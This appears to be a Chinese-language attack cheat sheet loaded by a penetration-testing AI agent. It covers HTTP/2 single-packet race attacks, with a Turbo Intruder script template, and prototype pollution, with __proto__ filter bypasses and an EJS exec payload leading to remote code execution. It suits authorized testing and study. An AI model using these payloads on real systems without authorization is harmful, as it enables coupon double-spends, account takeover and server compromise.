# Web 竞态条件与原型链污染 — 单包攻击与 Gadget 速查

> 当遇到竞态条件或原型链污染（PP）场景时通过 Read 工具加载。
> client-side 攻击见 `$AGENT_DIR/knowledge-base/client-side-attacks.md`。

## §1 单包攻击（Single-Packet Attack）

> James Kettle (PortSwigger) 2023 提出，把 HTTP/2 并发竞态从"碰运气"变成"可靠可复现"。

### 原理
把 20-30 个 HTTP/2 请求**预发主体**（发除最后一字节外的全部 data frame），靠 Nagle 算法打包进同一 TCP 包，最后**一次性发出所有保留帧** → 同包到达，彻底消除网络抖动。

### 适用场景
- **limit-overrun**: 优惠码/礼品码"限用一次"→ 同时发多个重复使用
- **单端点碰撞**: 同一请求的两个实例同时修改同一资源（如 Devise CVE-2022-4037：同时改邮箱到两个地址，收件人用实例变量但 token 从 DB 重读 → 邮件发错地址但 token 有效）
- **多端点碰撞**: 不同端点共享同一状态
- **密码重置接管**: 同时用两个 token 触发重置

### 操作步骤（Turbo Intruder）
```python
# Turbo Intruder 脚本: single-packet-attack.py 模板
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           engine=Engine.BURP2,  # HTTP/2
                           concurrentConnections=1,
                           requestsPerCurrentConnection=30)
    # 预发所有请求（不发最后一字节）
    for i in range(30):
        engine.queue(target.req, i, pauseMarker=len(b'body')-1)
    # 一次性发出所有保留帧
    engine.startOpenTimer()
    engine.completeRequests()
```

或用 **Burp Repeater "Send group in parallel"**（2024+ 内置）。

### 方法论
1. 预测潜在碰撞对象（哪些操作共享状态）
2. 探测异常（响应/耗时/二阶邮件差异）
3. 精简到 2 请求验证
4. 不支持 HTTP/2 时退回 **last-byte sync**（20 个 TCP 连接预发，同时发最后字节）

## §2 原型链污染（Prototype Pollution）

> JavaScript 递归 merge 不清洗 `__proto__` 键 → 污染 `Object.prototype` → 下游 gadget 读取。

### Sources（污染入口）
| 来源 | 示例 |
|------|------|
| URL query | `?__proto__[x]=y` |
| JSON | `{"__proto__": {"x": "y"}}` |
| Web message | `postMessage({__proto__: {...}})` |

### 绕过 key 过滤
```
__proto__ → %5f%5fproto%5f%5f（URL 编码）
__proto__ → constructor.prototype（绕 __proto__ 黑名单）
```

### Server-side 检测（无反射时）
| 方法 | 原理 | 成功标志 |
|------|------|---------|
| JSON spaces override | `__proto__[json spaces]=7` | 响应 JSON 缩进从 2 变 7 |
| Status code override | `__proto__[status]=555` | 响应状态码变 555 |
| Charset Override | `__proto__[charset]=UTF-7` | 响应 charset 变化 |

### Client-side 检测
用 **DOM Invader**（Burp 内置）自动找 PP 源和 gadget。

### 常见 Gadgets 速查（2023-2026 高频）
| Gadget | 库/场景 | 利用 |
|--------|--------|------|
| `transport_url` / `src` | 通用 `<script src>` 配置 | 污染 → 加载攻击者 JS → XSS |
| `baseURL` / `headers` | **axios** | 污染 baseURL → 控制请求目标 |
| `execArgv` / `execPath` / `env` | **child_process.fork/execSync** | 污染 → RCE |
| `shell` | **child_process** | `__proto__[shell]=node` → 通过 NODE_OPTIONS RCE |
| `html` / `template` | 模板引擎（EJS/Pug/Hogan） | 污染 → SSTI → RCE |
| `outputFunctionName` | **EJS** | `__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('...')//` |

### RCE 链（Server-side PP → RCE）
```
1. 找到 PP source（URL/JSON）
2. 确认 PP 生效（JSON spaces/status/charset override 检测）
3. 找 gadget: grep merge/assign/deparam + child_process/template engine
4. 污染 gadget 属性 → 触发 RCE
```

## §3 服务端竞态排查清单

| 场景 | 排查方向 |
|------|---------|
| 礼品码/优惠码 | 同时提交多次看是否重复使用 |
| 邮箱确认/密码重置 | 同时改到两个地址，看邮件/token 是否错配 |
| 余额/积分 | 同时消费看是否双花 |
| 文件上传 | 同时上传同名文件看是否覆盖竞争 |
| PHP session 锁 | PHP 默认 session 文件锁串行化 → 换不同 session 或不同 cookie |
| 数据库事务 | 隔离级别不足 → check-then-act 非原子 |

## §4 关联文件

- `$AGENT_DIR/knowledge-base/client-side-attacks.md` — 客户端攻击（bfcache/CSS exfil/xsleak）
- `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — 服务端漏洞模式
